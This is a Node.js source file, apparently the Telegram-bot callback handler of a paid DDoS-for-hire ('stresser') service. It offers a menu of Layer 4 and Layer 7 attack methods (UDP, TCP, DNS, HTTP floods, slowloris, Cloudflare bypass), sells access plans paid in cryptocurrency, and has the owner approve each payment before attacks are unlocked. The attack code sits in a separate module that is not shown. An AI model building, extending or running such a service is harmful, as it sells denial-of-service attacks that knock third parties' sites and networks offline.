const config = require('../../config/config');
const userService = require('../services/userService');
const paymentService = require('../services/paymentService');
const commandHandler = require('./commandHandler');
const attackHandler = require('./attackHandler');
const { formatMethodsList } = require('../utils/commands');
const {
  mainMenuKeyboard,
  backToMenuKeyboard,
  cryptoKeyboard,
  paymentConfirmKeyboard,
  ownerApprovalKeyboard,
  methodsKeyboard,
  methodSelectedKeyboard
} = require('../utils/keyboards');

class CallbackHandler {
  handleCallback(bot, query) {
    const chatId = query.message.chat.id;
    const telegramId = query.from.id;
    const data = query.data;

    userService.registerUser(query.from);

    if (data === 'menu_main') {
      attackHandler.clearMethodSession(telegramId);
      bot.answerCallbackQuery(query.id);
      bot.editMessageText('Menu', {
        chat_id: chatId,
        message_id: query.message.message_id,
        reply_markup: mainMenuKeyboard()
      });
      return;
    }

    if (data === 'menu_methods') {
      attackHandler.clearMethodSession(telegramId);
      bot.answerCallbackQuery(query.id);
      this.showMethods(bot, chatId, query.message.message_id);
      return;
    }

    if (data === 'menu_plans') {
      bot.answerCallbackQuery(query.id);
      this.editOrSendPlans(bot, chatId, query.message.message_id);
      return;
    }

    if (data === 'menu_account') {
      bot.answerCallbackQuery(query.id);
      commandHandler.sendAccount(bot, chatId, telegramId);
      return;
    }

    if (data.startsWith('method_')) {
      this.handleMethodTap(bot, query, data.replace('method_', ''));
      return;
    }

    if (data.startsWith('plan_')) {
      bot.answerCallbackQuery(query.id);
      commandHandler.sendPlanDetail(bot, chatId, Number(data.replace('plan_', '')));
      return;
    }

    if (data.startsWith('pay_')) {
      const plan = config.plans.find((p) => p.id === Number(data.replace('pay_', '')));
      if (!plan) {
        bot.answerCallbackQuery(query.id, { text: 'Not found' });
        return;
      }

      bot.answerCallbackQuery(query.id);
      bot.sendMessage(chatId, `${plan.name} - ${plan.price} EUR\n\nHow do you wanna pay?`, {
        reply_markup: cryptoKeyboard(plan.id)
      });
      return;
    }

    if (data.startsWith('crypto_')) {
      const parts = data.replace('crypto_', '').split('_');
      const planId = Number(parts[0]);
      const crypto = parts[1];
      const plan = config.plans.find((p) => p.id === planId);

      if (!plan) {
        bot.answerCallbackQuery(query.id, { text: 'Not found' });
        return;
      }

      const paymentId = userService.createPayment(telegramId, planId, crypto, plan.price);

      bot.answerCallbackQuery(query.id);
      bot.sendMessage(chatId, paymentService.formatPaymentMessage(plan, crypto, paymentId), {
        reply_markup: paymentConfirmKeyboard(paymentId)
      });
      return;
    }

    if (data.startsWith('confirm_pay_')) {
      this.handlePaymentConfirm(bot, query, Number(data.replace('confirm_pay_', '')));
      return;
    }

    if (data.startsWith('owner_approve_')) {
      this.handleOwnerApprove(bot, query, Number(data.replace('owner_approve_', '')));
      return;
    }

    if (data.startsWith('owner_reject_')) {
      this.handleOwnerReject(bot, query, Number(data.replace('owner_reject_', '')));
      return;
    }

    bot.answerCallbackQuery(query.id);
  }

  handleMethodTap(bot, query, methodId) {
    const chatId = query.message.chat.id;
    const telegramId = query.from.id;
    const method = config.methods.find((m) => m.id === methodId);

    if (!method) {
      bot.answerCallbackQuery(query.id, { text: 'Not found' });
      return;
    }

    const plan = userService.getActivePlan(telegramId);

    if (!plan) {
      bot.answerCallbackQuery(query.id, { text: 'No plan' });
      bot.editMessageText('No active plan.\nBuy a plan first.', {
        chat_id: chatId,
        message_id: query.message.message_id,
        reply_markup: backToMenuKeyboard()
      }).catch(() => {
        bot.sendMessage(chatId, 'No active plan.\nBuy a plan first.', { reply_markup: backToMenuKeyboard() });
      });
      return;
    }

    attackHandler.setMethodSession(telegramId, method);
    bot.answerCallbackQuery(query.id, { text: method.name });

    bot.editMessageText(attackHandler.getMethodPrompt(method), {
      chat_id: chatId,
      message_id: query.message.message_id,
      reply_markup: methodSelectedKeyboard(methodId)
    }).catch(() => {
      bot.sendMessage(chatId, attackHandler.getMethodPrompt(method), {
        reply_markup: methodSelectedKeyboard(methodId)
      });
    });
  }

  showMethods(bot, chatId, messageId) {
    const text = `Methods\n\nLayer 4: /udp /tcp /icmp /dns\nLayer 7: /http /post /slowloris /browser /cloudflare\n\nTap a method:`;

    bot.editMessageText(text, {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: methodsKeyboard()
    }).catch(() => {
      commandHandler.sendMethods(bot, chatId);
    });
  }

  handlePaymentConfirm(bot, query, paymentId) {
    const chatId = query.message.chat.id;
    const telegramId = query.from.id;
    const payment = userService.getPayment(paymentId);

    if (!payment) {
      bot.answerCallbackQuery(query.id, { text: 'Not found' });
      return;
    }

    if (payment.telegram_id !== telegramId) {
      bot.answerCallbackQuery(query.id, { text: 'Unauthorized' });
      return;
    }

    if (payment.status === 'confirmed') {
      bot.answerCallbackQuery(query.id, { text: 'Already approved' });
      return;
    }

    if (payment.status === 'awaiting_approval') {
      bot.answerCallbackQuery(query.id, { text: 'Already waiting' });
      bot.sendMessage(chatId, `Payment #${paymentId} is waiting for owner approval.`, {
        reply_markup: backToMenuKeyboard()
      });
      return;
    }

    if (payment.status === 'rejected') {
      bot.answerCallbackQuery(query.id, { text: 'Rejected' });
      return;
    }

    const submitted = userService.submitPaymentForReview(paymentId);
    const plan = config.plans.find((p) => p.id === payment.plan_id);
    const user = userService.getUser(telegramId);

    if (!submitted) {
      bot.answerCallbackQuery(query.id, { text: 'Error' });
      return;
    }

    bot.answerCallbackQuery(query.id, { text: 'Sent to owner' });

    bot.sendMessage(
      chatId,
      `Payment #${paymentId} sent for review.\nPlan: ${plan?.name}\nAmount: ${payment.amount_eur} EUR\n\nOwner must approve before access.`,
      { reply_markup: backToMenuKeyboard() }
    );

    if (config.adminUserId) {
      bot.sendMessage(
        config.adminUserId,
        paymentService.formatOwnerPaymentAlert(submitted, user, plan),
        { reply_markup: ownerApprovalKeyboard(paymentId) }
      ).catch(() => {});
    }
  }

  handleOwnerApprove(bot, query, paymentId) {
    const chatId = query.message.chat.id;

    if (!userService.isOwner(query.from.id)) {
      bot.answerCallbackQuery(query.id, { text: 'Unauthorized' });
      return;
    }

    const payment = userService.confirmPayment(paymentId);
    const plan = config.plans.find((p) => p.id === payment?.plan_id);

    if (!payment) {
      bot.answerCallbackQuery(query.id, { text: 'Already done' });
      return;
    }

    bot.answerCallbackQuery(query.id, { text: 'Approved' });

    bot.sendMessage(chatId, `Approved #${paymentId}`);

    bot.sendMessage(
      payment.telegram_id,
      `Plan active: ${plan?.name}\nPayment ID: #${paymentId}\n\nTap Methods to start.`,
      { reply_markup: backToMenuKeyboard() }
    ).catch(() => {});
  }

  handleOwnerReject(bot, query, paymentId) {
    const chatId = query.message.chat.id;

    if (!userService.isOwner(query.from.id)) {
      bot.answerCallbackQuery(query.id, { text: 'Unauthorized' });
      return;
    }

    const payment = userService.rejectPayment(paymentId);

    if (!payment) {
      bot.answerCallbackQuery(query.id, { text: 'Already done' });
      return;
    }

    bot.answerCallbackQuery(query.id, { text: 'Rejected' });

    bot.sendMessage(chatId, `Rejected #${paymentId}`);

    bot.sendMessage(
      payment.telegram_id,
      `Payment #${paymentId} rejected.`,
      { reply_markup: backToMenuKeyboard() }
    ).catch(() => {});
  }

  editOrSendPlans(bot, chatId, messageId) {
    bot.editMessageText('Plans', {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: require('../utils/keyboards').plansKeyboard()
    }).catch(() => {
      commandHandler.sendPlans(bot, chatId);
    });
  }
}

module.exports = new CallbackHandler();
